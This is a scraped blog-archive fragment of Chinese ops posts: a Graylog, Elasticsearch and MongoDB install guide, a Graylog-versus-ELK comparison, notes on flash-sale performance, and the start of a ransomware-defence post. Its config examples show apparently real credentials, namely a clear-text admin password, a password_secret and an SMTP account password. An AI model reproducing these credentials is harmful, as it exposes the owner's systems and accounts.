14:27 pts/1 00:00:13 /srv/jdk1.8.0_66/bin/java -Xms256m -Xmx1g -Djava.awt.headless=true -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -XX:+HeapDumpOnOutOfMemoryError -XX:+DisableExplicitGC -Dfile.encoding=UTF-8 -Djna.nosys=true -Des.path.home=/opt/elasticsearch-2.3.5 -cp /opt/elasticsearch-2.3.5/lib/elasticsearch-2.3.5.jar:/opt/elasticsearch-2.3.5/lib/* org.elasticsearch.bootstrap.Elasticsearch start -d502 18530 18266 0 14:27 pts/1 00:00:00 grep --color=auto ela (5)检查elasticsearch服务状态 执行如下命令测试Elasticsearch是否正常运行： $ curl -XGET ‘http://localhost:9200/_cluster/health?pretty=true‘ 输出的信息如下表示Elasticsearch安装成功： 123456789101112131415161718[elasticsearch@graylog bin]$ curl -XGET 'http://192.168.1.234:9200/_cluster/health?pretty=true'&#123; \"cluster_name\" : \"graylog\", \"status\" : \"yellow\", \"timed_out\" : false, \"number_of_nodes\" : 1, \"number_of_data_nodes\" : 1, \"active_primary_shards\" : 30, \"active_shards\" : 30, \"relocating_shards\" : 0, \"initializing_shards\" : 0, \"unassigned_shards\" : 30, \"delayed_unassigned_shards\" : 0, \"number_of_pending_tasks\" : 0, \"number_of_in_flight_fetch\" : 0, \"task_max_waiting_in_queue_millis\" : 0, \"active_shards_percent_as_number\" : 50.0&#125; 3：安装部署graylog-2.1版本(1)下载安装包 1wget https://packages.graylog2.org/releases/graylog/graylog-2.1.1.tgz (2)解压安装包 1tar -zxvf graylog-2.1.1.tgz -C /opt/. (3)修改配置文件 修改安装目录下 graylog.conf.example 文件 1vim graylog.conf.example web_listen_uri 值是graylog启动成功后，web服务访问地址 1web_listen_uri = http://192.168.1.234:9000/ rest_listen_uri 的值，是graylog启动成功后，api访问地址 1rest_listen_uri = http://192.168.1.234:9000/api/ root_timezone = UTC #设置时区，否则默认使用的是UTC时间也就是世界时间 这里是必须改下的，因为后期收集日志显示时间是有变化的。 1root_timezone = Asia/Shanghai 其中 password_secret 的值用命令生成 1234yum install -y pwgenpwgen -N 1 -s 96 H1R5v17kWtyDxj2PzxLMxu41D6HDt9JzhfZcj6QlCURVddgkLAdnUmpkdIscmmu4ELKsTrHwKvPmxFKSYyTn0YlqebbpQqyr password_secret = H1R5v17kWtyDxj2PzxLMxu41D6HDt9JzhfZcj6QlCURVddgkLAdnUmpkdIscmmu4ELKsTrHwKvPmxFKSYyTn0YlqebbpQqyr 其中root_password_sha2 的值使用命令生成 123456echo -n Ihaozhuo_b313 | sha256sum (这里对密码123456哈希加密)fc88c28d48b0cb97f3fb5286cc35c520409ef037acd30ec687f0c0bd3d5a5115 root_password_sha2 = fc88c28d48b0cb97f3fb5286cc35c520409ef037acd30ec687f0c0bd3d5a5115 elasticsearch_cluster_name 值必须是elasticsearch配置文件中的cluster_name 12elasticsearch_cluster_name = graylog elasticsearch_discovery_zen_ping_unicast_hosts 填写elasticsearch地址，如果是多个，用逗号隔开 12elasticsearch_discovery_zen_ping_unicast_hosts = 192.168.1.234:9300 elasticsearch_discovery_zen_ping_multicast_enabled = false 多播模式关闭 由于我们只有一个Elasticsearch shard，需要把elasticsearch_shards参数设置为1：elasticsearch集群分片数量 1elasticsearch_shards = 1 elasticsearch绑定的节点IP 123299 elasticsearch_network_host = 192.168.1.234300 elasticsearch_network_bind_host = 192.168.1.234301 elasticsearch_network_publish_host = 192.168.1.234 mongodb安装服务的ip地址 1mongodb_uri = mongodb://192.168.1.234/graylog 这里mongodb是安装在我同一台服务器上面的。如果要把mongodb单独服务器跑连接方式配置文件里面也有例子说明： 1mongodb_uri =mongodb://graylog:123456@160.17.2.251:27017/graylog2 #连接到mongodb的服务器地址为160.17.2.251:27017，账号为graylog，密码为123456 数据库为graylog2 设置告警邮件发送者信息 1234567891011 # Email transporttransport_email_enabled = falsetransport_email_hostname = smtp.exmail.qq.comtransport_email_port = 465transport_email_use_auth = truetransport_email_use_tls = truetransport_email_use_ssl = truetransport_email_auth_username = chengyangyang@qq.cntransport_email_auth_password = beneTqqtransport_email_subject_prefix = [graylog]transport_email_from_email = chengyangyang@qq.cn (4)复制配置文件 因为graylog安装bin目录下，默认启动配置文件 配置文件路径：/etc/graylog/server/server.conf 所以需要将graylog.conf.example 复制到/etc/graylog/server/目录下，并且改名 server.conf 执行命令： 12mkdir -p /etc/graylog/server/ cp graylog.conf.example /etc/graylog/server/server.conf (5)启动graylog 在graylog安装bin目录下执行 1./graylogctl start 查看日志，在graylog安装目录下执行 1tail -200f /log/graylog-server.log 如果报错： 原因： 在mongodb版本2.6之后，是需要日志journaling设置的，而默认情况下是关闭的 解决办法： 在mongodb启动命令加上 –journal 最后启动命令： 1./mongod --dbpath=/usr/local/mongodb/data/ --fork --logpath=/usr/local/mongodb/logs --storageEngine=mmapv1 --journal 重启mongodb后，重启graylog服务即可！ (6)启动graylog(报错二) 查看日志，在graylog安装目录下执行 12tail -200f /log/graylog-server.log 12345678&#123;com.mongodb.MongoSocketOpenException: Exception opening socket&#125;, caused by &#123;java.net.ConnectException: 拒绝连接&#125;&#125;]&#125;. Waiting for 30000 ms before timing out2016-11-22 15:10:29,355 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Elastic Beats Input 1.1.1 [org.graylog.plugins.beats.BeatsInputPlugin]2016-11-22 15:10:29,357 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Collector 1.1.1 [org.graylog.plugins.collector.CollectorPlugin]2016-11-22 15:10:29,357 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Enterprise Integration Plugin 1.1.1 [org.graylog.plugins.enterprise_integration.EnterpriseIntegrationPlugin]2016-11-22 15:10:29,358 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: MapWidgetPlugin 1.1.1 [org.graylog.plugins.map.MapWidgetPlugin]2016-11-22 15:10:29,359 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Pipeline Processor Plugin 1.1.1 [org.graylog.plugins.pipelineprocessor.ProcessorPlugin]2016-11-22 15:10:29,359 INFO : org.graylog2.bootstrap.CmdLineTool - Loaded plugin: Anonymous Usage Statistics 2.1.1 [org.graylog.plugins.usagestatistics.UsageStatsPlugin]2016-11-22 15:10:29,487 INFO : org.graylog2.bootstrap.CmdLineTool - Running with JVM arguments: -Djava.library.path=./../lib/sigar -Xms1g -Xmx1g -XX:NewRatio=1 -XX:+ResizeTLAB -XX:+UseConcMarkSweepGC -XX:+CMSConcurrentMTEnabled -XX:+CMSClassUnloadingEnabled -XX:+UseParNewGC -XX:-OmitStackTraceInFastThrow 提示mongodb 拒绝连接。 这个时候需要看下端口地址是否是IP地址还是127.0.0.1 如果不是需要修改下在重启服务就可以了。 查看启动服务端口： 123456789101112[root@graylog graylog-2.1.1]# netstat -ntulpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 127.0.0.1:27017 0.0.0.0:* LISTEN 22308/mongodtcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1974/sshdtcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1287/mastertcp 0 0 ::ffff:192.168.1.234:9350 :::* LISTEN 23642/javatcp 0 0 ::ffff:192.168.1.234:9000 :::* LISTEN 23642/javatcp 0 0 ::ffff:192.168.1.234:9200 :::* LISTEN 18405/javatcp 0 0 ::ffff:192.168.1.234:9300 :::* LISTEN 18405/javatcp 0 0 :::22 :::* LISTEN 1974/sshdtcp 0 0 ::1:25 :::* LISTEN 1287/master (6)访问graylog graylog启动成功后，浏览器访问：graylog安装IP:9000 四：总结到此，基础的集中日志管理graylog安装完毕！，后续将继续介绍： 安装部署Graylog Collector Sidecar 收集应用日志 采用syslog收集日志方式 graylog一些使用，包括日志截取，告警等。 之前也实践过ELK技术栈，后来选型graylog，是基于graylog带有的权限管理，和告警功能比较完善！","raw":null,"content":null,"categories":[{"name":"日志分析平台","slug":"日志分析平台","permalink":"http://blog.yangcvo.me/categories/日志分析平台/"}],"tags":[{"name":"Log analysis platform","slug":"Log-analysis-platform","permalink":"http://blog.yangcvo.me/tags/Log-analysis-platform/"}]},{"title":"Graylog——日志分析平台完美代替Elasticsearch","slug":"日志分析\u0010平台/Graylog/Graylog—日志分析平台完美代替Elasticsearch","date":"2016-11-13T09:56:03.000Z","updated":"2017-03-14T05:48:57.000Z","comments":true,"path":"2016/11/13/日志分析\u0010平台/Graylog/Graylog—日志分析平台完美代替Elasticsearch/","link":"","permalink":"http://blog.yangcvo.me/2016/11/13/日志分析\u0010平台/Graylog/Graylog—日志分析平台完美代替Elasticsearch/","excerpt":"","text":"摘要: 提起日志聚合工具，有开源界的ELK，商业界的Splunk，但我要介绍开源的后起之秀Graylog，可以说是龙头老大Splunk的开源版。 Graylog——日志分析平台完美代替Elasticsearch先看看 推荐！国外程序员整理的系统管理员资源大全 中，国外程序员整理的日志聚合工具的列表： 日志管理工具：收集，解析，可视化 Elasticsearch - 一个基于Lucene的文档存储，主要用于日志索引、存储和分析。 Fluentd - 日志收集和发出 Flume -分布式日志收集和聚合系统 Graylog2 -具有报警选项的可插入日志和事件分析服务器 Heka -流处理系统，可用于日志聚合 Kibana - 可视化日志和时间戳数据 Logstash -管理事件和日志的工具 Octopussy -日志管理解决方案（可视化/报警/报告） Graylog与ELK方案的对比 ELK： Logstash -&gt; Elasticsearch -&gt; Kibana （使用了一些插件head ，marvel） Graylog： Graylog Collector -&gt; Graylog Server(封装Elasticsearch) -&gt; Graylog Web 做为运维，公司内部使用elk处理日志发现很多问题。 顺便截图了几张： 之前试过Logstash + Elasticsearch + Kibana的方案，发现有几个缺点： 不能处理多行日志，比如Mysql慢查询，Tomcat/Jetty应用的Java异常打印 不能保留原始日志，只能把原始日志分字段保存，这样搜索日志结果是一堆Json格式文本，无法阅读。 不复合正则表达式匹配的日志行，被全部丢弃。 kibana结合使用经常会出现卡死。资源消耗非常大。 本着解决以上3个缺点的原则，再次寻找替代方案。 首先找到了商业日志工具Splunk，号称日志界的Google，意思是全文搜索日志的能力，不光能解决以上3个缺点，还提供搜索单词高亮显示，不同错误级别日志标色等吸引人的特性，但是免费版有500M限制，付费版据说要3万美刀，只能放弃，继续寻找。 最后找到了Graylog，第一眼看到Graylog，只是系统日志syslog的采集工具，一点也没吸引到我。但后来深入了解后，才发现Graylog简直就是开源版的Splunk。 我自己总结的Graylog吸引人的地方： 一体化方案，安装方便，不像ELK有3个独立系统间的集成问题。 采集原始日志，并可以事后再添加字段，比如http_status_code，response_time等等。 自己开发采集日志的脚本，并用curl/nc发送到Graylog Server，发送格式是自定义的GELF，Flunted和Logstash都有相应的输出GELF消息的插件。自己开发带来很大的自由度。实际上只需要用inotifywait监控日志的modify事件，并把日志的新增行用curl/netcat发送到Graylog Server就可。 搜索结果高亮显示，就像google一样。 搜索语法简单，比如： source:mongo AND reponse_time_ms:&gt;5000，避免直接输入elasticsearch搜索json语法 搜索条件可以导出为elasticsearch的搜索json文本，方便直接开发调用elasticsearch rest api的搜索脚本。 Graylog图解 Graylog开源版官网： https://www.graylog.org/ 来几张官网的截图： Graylog是强大的日志管理、分析工具。它基于 Elasticsearch, Java和MongoDB。 Graylog可以收集监控多种不同应用的日志。但是为了示范说明，我只收集syslog。并且，我将会把用到的组件全部安装到一个单独的服务器上。对于大型、生产系统你可以把组件分开安装在不同的服务器上，这样可以提高效率。 Graylog的组件Graylog有4个基本组件： 1234Graylog Server：这个服务负责接收和处理日志/消息，并且和其他组件沟通。Elasticsearch：存储所有的日志，它的性能依赖内存和硬盘IO。MongoDB：存储元数据，负载不高。graylog-Web接口：用户接口。 下面是Graylog组件之间的关系图： 下面来自我公司内部分享的PPT拍图： 生产环境 我参考网上一些博客画的图： 系统要求： CentOS 6.7 内存至少2GB 有root权限 服务器ip是192.168.1.234，已安装 1.8.0_77-b03 这里我只是举例单一模式跑服务。 安装MongoDBMongoDB的安装非常简单，执行如下命令导入MongoDB GPG密钥到rpm： 123456789101112131415161718192021222324252627282930313233343536373839404142[root@graylog yum.repos.d]# vim /etc/yum.repos.d/mongodb-org-3.0.repo---[mongodb-org-3.0]name=MongoDB Repositorybaseurl=http://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/3.0/x86_64/gpgcheck=0enabled=1---[root@graylog yum.repos.d]# yum install -y mongodb-org[root@graylog yum.repos.d]# vi /etc/yum.conf最后一行添加：---exclude=mongodb-org,mongodb-org-server,mongodb-org-shell,mongodb-org-mongos,mongodb-org-tools---[root@graylog yum.repos.d]# service mongod start[root@graylog yum.repos.d]# chkconfig mongod on[root@graylog yum.repos.d]# vi /etc/security/limits.conf最后一行添加：---* soft nproc 65536* hard nproc 65536mongod soft nproc 65536* soft nofile 131072* hard nofile 131072---[root@graylog ~]# vi /etc/init.d/mongodulimit -f unlimited 行前插入：--- if test -f /sys/kernel/mm/transparent_hugepage/enabled; then echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled fi if test -f /sys/kernel/mm/transparent_hugepage/defrag; then echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag fi---[root@graylog ~]# /etc/init.d/mongod restart 安装ElasticsearchGraylog目前为止只能使用Elasticsearch 2.0以前的版本，所以，在这一步中，我将安装Elasticsearch 1.7.x。 添加Elasticsearch GPG密钥： $ sudo rpm --import http://packages.elastic.co/GPG-KEY-elasticsearch 创建Elasticsearch源： $ sudo vim /etc/yum.repos.d/elasticsearch.repo 写入如下内容： 123456[elasticsearch-1.7]name=Elasticsearch repository for 1.7.x packagesbaseurl=http://packages.elastic.co/elasticsearch/1.7/centosgpgcheck=1gpgkey=http://packages.elastic.co/GPG-KEY-elasticsearchenabled=1 安装Elasticsearch： $ sudo yum -y install elasticsearch 配置前先创建几个目录文件 mkdir /data/es-data -p mkdir /data/es-work -p Elasticsearch安装完成之后，编辑配置文件： sudo vim /etc/elasticsearch/elasticsearch.yml node.data: true # 数据存放true 找到cluster.name一行，取消这一行的注释，并把值改为graylog-development： cluster.name: graylog-development path.data: /data/es-data es数据存放目录 这里需要自己新建目录 path.work: /data/es-work 你也许想要限制外部访问Elasticsearch（端口9200），这样可以提高系统的安全性。找到network.host一行，取消注释，并把值改为localhost： network.host: 192.168.1.234 保存退出文件。 重启Elasticsearch： $ service elasticsearch start 设置开机启动： $ chkconfig --add elasticsearch 执行如下命令测试Elasticsearch是否正常运行： $ curl -XGET &apos;http://localhost:9200/_cluster/health?pretty=true&apos; 输出的信息如下表示Elasticsearch安装成功： 1234567891011121314151617drwxr-xr-x. 2 root root 4096 9月 23 2011 src[root@ELK local]# curl -XGET 'http://192.168.1.234:9200/_cluster/health?pretty=true'&#123; \"cluster_name\" : \"graylog-development\", \"status\" : \"yellow\", \"timed_out\" : false, \"number_of_nodes\" : 1, \"number_of_data_nodes\" : 1, \"active_primary_shards\" : 37, \"active_shards\" : 37, \"relocating_shards\" : 0, \"initializing_shards\" : 0, \"unassigned_shards\" : 37, \"delayed_unassigned_shards\" : 0, \"number_of_pending_tasks\" : 0, \"number_of_in_flight_fetch\" : 0&#125; 安装Graylag Graylog的最新版是1.1.4，下载链接如下：https://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-server-1.1.4-1.noarch.rpmhttps://packages.graylog2.org/repo/el/6Server/1.1/x86_64/graylog-web-1.1.4-1.noarch.rpm 现在Graylog的所有依赖软件安装完成，这一步我们来安装graylog-server。 首先，下载Graylog RPM软件包： $ cd $ sudo rpm -Uvh https://packages.graylog2.org/repo/packages/graylog-1.3-repository-el7_latest.rpm 安装graylog-server： yum -y install graylog-server 安装pwgen，我们使用它生成随机密码： yum -y install epel-release yum -y install pwgen 现在我们来设置Graylog管理员的密钥。配置文件位于/etc/graylog/server/server.conf目录，需要修改password_secret参数： $ SECRET=$(pwgen -s 96 1) $ sudo -E sed -i -e &apos;s/password_secret =.*/password_secret = &apos;$SECRET&apos;/&apos; /etc/graylog/server/server.conf 执行完上面命令之后，password_secret参数的样子： 这一步，设置管理员密码。由于密码使用sha哈希算法，我们需要把明文密码转换为hash，然后赋值给root_password_sha2参数。例如，我要设置的管理员密码是 Ihaozhuo_b313，它对应的hash为： $ echo -n Ihaozhuo_b313 | sha256sum | awk &apos;{print $1}&apos; 编辑/etc/graylog/server/server.conf，设置root_password_sha2参数： $ sudo vim /etc/graylog/server/server.conf 现在Graylog管理员密码为Ihaozhuo_b313。 配置rest_transport_uri参数，设置Graylog web接口和服务器的沟通方式。由于我们把所有组件都安装到了单独的一个服务器上，需要把值设置为127.0.0.1 或 localhost。找到rest_transport_uri一行，取消注释，并把值设置为： rest_transport_uri = http://192.168.1.234:12900/ 由于我们只有一个Elasticsearch shard，需要把elasticsearch_shards参数设置为1： elasticsearch_shards = 1 更改elasticsearch_cluster_name参数，应该和前面Elasticsearch的cluster.name参数相对应： elasticsearch_cluster_name = graylog-development 取消下面两行的注释，检测Elasticsearch： 172 elasticsearch_discovery_zen_ping_multicast_enabled = false 173 elasticsearch_discovery_zen_ping_unicast_hosts = 192.168.1.234:9300 启动graylog-server： /etc/init.d/graylog-web restart 安装Graylog Web安装Graylog Web： $ sudo yum -y install graylog-web 安装完成之后配置Graylog Web的密钥，配置文件位于/etc/graylog/web/web.conf，更改application.secret参数： $ SECRET=$(pwgen -s 96 1) $ sudo -E sed -i -e &apos;s/application\\.secret=&quot;&quot;/application\\.secret=&quot;&apos;$SECRET&apos;&quot;/&apos; /etc/graylog/web/web.conf 配置graylog2-server.uris参数，它的值应该和Graylog的rest_listen_uri参数相对应： $ sudo vim /etc/graylog/web/web.conf graylog2-server.uris=&quot;http://127.0.0.1:12900/&quot; 重启graylog-web： /etc/init.d/graylog-web restart 配置Graylog服务器接收其他服务器的syslog日志登录Graylog Web使用浏览器访问Graylog服务器的域名或IP：http://graylog_public_IP_domain:9000/。 你应该能看到一个登录界面，使用admin做为用户名和前面设置的密码登录。 登录之后： 上面的红数字1是通知（you have a node without any running inputs），下面设置通过UDP接收syslog。 创建syslog UDP输入 添加要接收的其他服务器syslog日志：System-&gt;Inputs-&gt;Syslog UDP-&gt;Launch new input。 在弹出的窗口上输入如下信息： Title: syslog Port: 8514 Bind address: 这里写Graylog-server服务器主机IP 点击Launch 如果你需要收集多个服务器的日志，重复上面步骤。 现在，我们的Graylog服务器已经做好了接收其他服务器发来日志的准备。下面我们还需要配置其他服务器，让这些服务器给Graylog服务器发送日志。 配置其他服务器给Graylog服务器发送syslog参考官网：从Linux系统日志发送到Graylog SSH登录“其他服务器”，创建rsyslog配置文件90-graylog.conf： sudo vim /etc/rsyslog.d/90-graylog.conf 添加如下代码，把 graylog_server_IP 替换为Graylog服务器ip地址： $template GRAYLOGRFC5424,&quot;&lt;%pri%&gt;%protocol-version% %timestamp:::date-rfc3339% %HOSTNAME% %app-name% %procid% %msg%\\n&quot; *.* @graylog_server_IP:8514;GRAYLOGRFC5424 重启rsyslog服务使生效： /etc/init.d/rsyslog restart 配置完成之后，回到Graylog Web，点击Sources，查看是否有新添加rsyslog。 Graylog使用http协议发送：添加要接收的其他服务器syslog日志：System-&gt;Inputs-&gt;GELF HTTP-&gt;Launch new input。 然后在服务器上面发送下面命令。 12[root@graylog-development ~]# curl -XPOST http://192.168.1.234:12201/gelf -p0 -d '&#123;\"short_message\":\"Hello there\", \"host\":\"example.org\", \"facility\":\"test\", \"_foo\":\"bar\"&#125;'[root@graylog-development ~]# curl -XPOST http://192.168.1.234:12201/gelf -p0 -d '&#123;\"short_message\":\"测试\", \"host\":\"example.org\", \"facility\":\"test\", \"_foo\":\"bar\"&#125;' 这里定义192.168.1.234 是graylog-server服务器地址 12201 端口是之前创建好的。 搜素Graylog假如你要搜索hello： 上面安装配置了基本的Graylog服务器。 时区和高亮设置admin帐号的时区： 12345[root@graylog ~]# vi /etc/graylog/server/server.conf---30 root_timezone = Asia/Shanghai---[root@graylog ~]# /etc/init.d/graylog-server restart 其他帐号的默认时区： 12345[root@graylog ~]# vi /etc/graylog/web/web.conf---18 timezone=\"Asia/Shanghai\"---[root@graylog ~]# /etc/init.d/graylog-web restart 允许查询结果高亮： 12345[root@graylog ~]# vi /etc/graylog/server/server.conf---147 allow_highlighting = true---[root@graylog ~]# /etc/init.d/graylog-server restart 移动数据目录123456789101112131415161718移动elasticsearch的数据目录[root@graylog ~]# sudo /etc/init.d/elasticsearch stop[root@graylog ~]# sudo cp -rp /var/lib/elasticsearch/ /data/[root@graylog ~]# sudo vi /etc/sysconfig/elasticsearch+16 DATA_DIR=/data/elasticsearch[root@graylog ~]# sudo /etc/init.d/elasticsearch start移动mongo的数据目录[root@graylog ~]# sudo /etc/init.d/mongod stop[root@graylog ~]# sudo cp -rp /var/lib/mongo /data/[root@graylog ~]# sudo vi /etc/mongod.conf---13 dbpath=/var/lib/mongo-&gt;13 dbpath=/data/mongo---[mtagent@access2 ~]$ sudo /etc/init.d/mongod start 其余参考文档参考官网 Centos7 搭建graylog Graylog——日志聚合工具中的后起之秀","raw":null,"content":null,"categories":[{"name":"日志分析平台","slug":"日志分析平台","permalink":"http://blog.yangcvo.me/categories/日志分析平台/"}],"tags":[{"name":"Log analysis platform","slug":"Log-analysis-platform","permalink":"http://blog.yangcvo.me/tags/Log-analysis-platform/"}]},{"title":"如何解决秒杀的性能问题和微信推广活动的讨论","slug":"运维笔记/如何解决抽奖的性能问题和秒杀的讨论  ","date":"2016-11-10T08:39:28.000Z","updated":"2016-12-15T14:25:24.000Z","comments":true,"path":"2016/11/10/运维笔记/如何解决抽奖的性能问题和秒杀的讨论  /","link":"","permalink":"http://blog.yangcvo.me/2016/11/10/运维笔记/如何解决抽奖的性能问题和秒杀的讨论  /","excerpt":"","text":"最近业务试水微信抽奖活动，公司现在打算推广下产品。增加些粉丝量 之前经常看到淘宝的同行们讨论秒杀，讨论电商，这次终于轮到我们自己理论结合实际一次了。 ps：进入正文前先说一点个人感受，之前看淘宝的ppt感觉都懂了，等到自己出解决方案的时候发现还是有很多想不到的地方其实都没懂，再次验证了“细节是魔鬼”的理论。并且一个人的能力有限，只有大家一起讨论才能想的更周全，更细致。好了，闲话少说，下面进入正文。 一、抽奖活动带来了什么？微信积分兑换现金或抢购抽奖活动一般会经过【关注公众号】【分享活动获得积分】【积分兑换】【抽奖安全环节】这3个大环节，而其中【抢订单】这个环节是最考验业务提供方的抗压能力的。 积分兑换环节一般会带来2个问题： 1、高并发 比较火热的抽奖在线人数都是20w起的，如此之高的在线人数对于网站架构从前到后都是一种考验。 2、抽奖人员过多 3、 抢订单 任何商品都会有数量上限，如何避免成功下订单买到商品的人数不超过商品数量的上限，这是每个抢购活动都要面临的难题。 二、如何解决？首先，产品解决方案我们就不予讨论了。我们只讨论技术解决方案 1、前端 123456789101112131415161718192021222324252627面对高并发的抢购活动，前端常用的三板斧是【扩容】【静态化】【限流】 A：扩容 加机器，这是最简单的方法，通过增加前端池的整体承载量来抗峰值。 这里我们都是多台主从集群去跑。 B：静态化 将活动页面上的所有可以静态的元素全部静态化，并尽量减少动态元素。通过CDN来抗峰值。 这里我们都是把图片静态放在又拍云和阿里云上面。 C：限流 一般都会采用IP级别的限流，即针对某一个IP，限制单位时间内发起请求数量。 或者活动入口的时候增加游戏或者问题环节进行消峰操作。 我们采用Nginx 前面做了反向代理后面优化nginx。 D：有损服务 最后一招，在接近前端池承载能力的水位上限的时候，随机拒绝部分请求来保护活动整体的可用性。 2、后端 那么后端的数据库在高并发和超卖下会遇到什么问题呢？主要会有如下3个问题：（主要讨论写的问题，读的问题通过增加cache可以很容易的解决） 1234567 I： 首先MySQL自身对于高并发的处理性能就会出现问题，一般来说，MySQL的处理性能会随着并发thread上升而上升，但是到了一定的并发度之后会出现明显的拐点，之后一路下降，最终甚至会比单thread的性能还要差。 II： 其次，超卖的根结在于减库存操作是一个事务操作，需要先select，然后insert，最后update -1。最后这个-1操作是不能出现负数的，但是当多用户在有库存的情况下并发操作，出现负数这是无法避免的。 III：最后，当减库存和高并发碰到一起的时候，由于操作的库存数目在同一行，就会出现争抢InnoDB行锁的问题，导致出现互相等待甚至死锁，从而大大降低MySQL的处理性能，最终导致前端页面出现超时异常。 这个有遇到过的，就是锁表导致访问出现网络异常。 针对上述问题，如何解决呢？ 我们先看眼淘宝的高大上解决方案： 12345 I： 关闭死锁检测，提高并发处理性能。 II：修改源代码，将排队提到进入引擎层前，降低引擎层面的并发度。 III：组提交，降低server和引擎的交互次数，降低IO消耗。 解决方案1：将存库从MySQL前移到Redis中，所有的写操作放到内存中，由于Redis中不存在锁故不会出现互相等待，并且由于Redis的写性能和读性能都远高于MySQL，这就解决了高并发下的性能问题。然后通过队列等异步手段，将变化的数据异步写入到DB中。 优点：解决性能问题 缺点：没有解决超卖问题，同时由于异步写入DB，存在某一时刻DB和Redis中数据不一致的风险。 解决方案2：引入队列，然后将所有写DB操作在单队列中排队，完全串行处理。当达到库存阀值的时候就不在消费队列，并关闭购买功能。这就解决了超卖问题。 优点：解决超卖问题，略微提升性能。 缺点：性能受限于队列处理机处理性能和DB的写入性能中最短的那个，另外多商品同时抢购的时候需要准备多条队列。 解决方案3：将写操作前移到MC中，同时利用MC的轻量级的锁机制CAS来实现减库存操作。 优点：读写在内存中，操作性能快，引入轻量级锁之后可以保证同一时刻只有一个写入成功，解决减库存问题。 缺点：没有实测，基于CAS的特性不知道高并发下是否会出现大量更新失败？不过加锁之后肯定对并发性能会有影响。 解决方案4：将提交操作变成两段式，先申请后确认。然后利用Redis的原子自增操作（相比较MySQL的自增来说没有空洞），同时利用Redis的事务特性来发号，保证拿到小于等于库存阀值的号的人都可以成功提交订单。然后数据异步更新到DB中。 优点：解决超卖问题，库存读写都在内存中，故同时解决性能问题。 缺点：由于异步写入DB，可能存在数据不一致。另可能存在少买，也就是如果拿到号的人不真正下订单，可能库存减为0，但是订单数并没有达到库存阀值。 三、总结 1231、前端三板斧【扩容】【限流】【静态化】2、后端两条路【内存】+【排队】 测试总结经验第一次做抽奖活动，测试那边测试出很多问题。 下面是遇到的问题。 12345测试第一次: 访问压测出现了访问白屏。定位：代码写的有问题。 tomcat需要做优化。 我们一般用户量粉丝在100W测试第二次： 出现数据库CPU瓶颈过高。主从同步，然后做了数据库读写分离， redis集群缓存。 最主要是数据库SQL语句做了优化。优化了提升了很大一部分。测试第三次：还有出现了503访问受限了。 后面做了nginx代理 防止同一个IP同一个时间超过多少次去请求，会被受限。 不过这个做DDOS攻击 有很大一部分影响用户名体验度。 四、非技术感想1、团队的力量是无穷的，各种各样的解决方案（先不谈可行性）都是在小伙伴们七嘴八舌中讨论出来的。我们需要让所有人都发出自己的声音，不要着急去否定。 2、优化需要从整体层面去思考，不要只纠结于自己负责的部分，如果只盯着一个点思考，最后很可能就走进死胡同中了。 3、有很多东西以为读过了就懂了，其实不然。依然还是需要实践，否则别人的知识永远不可能变成自己的。 4、多思考为什么，会发生什么，不要想当然。只有这样才能深入进去，而不是留在表面。","raw":null,"content":null,"categories":[{"name":"运维笔记","slug":"运维笔记","permalink":"http://blog.yangcvo.me/categories/运维笔记/"}],"tags":[]},{"title":"运维安全重要性：创业公司如何维护好服务器","slug":"运维安全/运维安全重要性：创业公司如何维护好服务器","date":"2016-11-02T04:07:27.000Z","updated":"2017-04-12T13:43:59.000Z","comments":true,"path":"2016/11/02/运维安全/运维安全重要性：创业公司如何维护好服务器/","link":"","permalink":"http://blog.yangcvo.me/2016/11/02/运维安全/运维安全重要性：创业公司如何维护好服务器/","excerpt":"","text":"运维安全重要性:创业公司如何维护好服务器2016年下半年，勒索软件成了企业安全的一个致命伤。卡巴斯基在2016年12月份发布的年度热门事件：加密勒索报告显示，截止到2016年，全球有114个国家受到加密勒索事件的影响，共发现44000多个勒索软件样本。亚信安全发布的勒索软件风险研究报告也显示，近十个月内，全球传播的勒索软件数量增长了15倍，中国勒索软件数量增长更是突破了67倍。 企业如遭到勒索，需要按照要求支付“赎金”，否则文件将有可能永远无法打开。勒索软件欺诈金额巨大，且防范困难；通常，企业支出的赎金，会用来发展下一代勒索软件。近期，国外安全研究人员还发现，有勒索软件目标锁定 Linux服务器，还有新型的勒索软件集成了DDoS功能。可预测，加密勒索事件仍会持续蔓延。 阿里云安全团队深入分析勒索软件背后成因阿里云安全团队第一时间告知用户勒索软件的蔓延趋势，并为用户提供应急加固方案。同时，从勒索软件行为方式方面着手，研发针对勒索加密软件的查杀功能，保证用户云上安全。 点击链接查看加密勒索软件防护方案：https://help.aliyun.com/knowledge_detail/48701.html 阿里云安全通过对目前勒索事件的数据分析，发现被勒索软件入侵的受害者，都有两大共性： 1、关键账号存在弱口令或无认证机制· 服务器登录关键账号(root、administrator)密码简单或空密码；· 数据库(Redis、MongoDB、MySQL、MSsql Server)等相关重要业务服务直接可以无密码登录。 2、无访问控制策略，业务“裸奔”在互联网上· RDP、SSH、Redis、MongoDB、MySQL、MSsql Server等高危服务直接裸奔在互联网上 以上两类问题是黑客利用成本较低的攻击方式。攻击者不需要获取账号密码，就可以对业务造成重创。目前，大部分勒索软件攻击都是通过Windows可执行文件中包含的恶意代码实现的，随着勒索软件的不断“变种”，还可能演化出新的攻击方式。 云计算平台如何帮助企业减少被勒索风险云计算平台的威胁情报能力，基础安全功能，安全产品和专家团队，能够有效帮助企业减少风险。相比自建IDC的封闭环境，云上的安全防护选择和管理手段更加多样化，企业在了解业务现状和防御情况的前提下，可在云上定制防御策略，找到合适自己的预防措施。 云平台为企业提供必要的安全工具（如快照功能），并具备强大的容灾、数据恢复能力；经验丰富的安全专家，会针对最新的攻击类型制定相应加固措施。 在应对勒索软件攻击的场景下，阿里云建议企业采用以下防护措施： 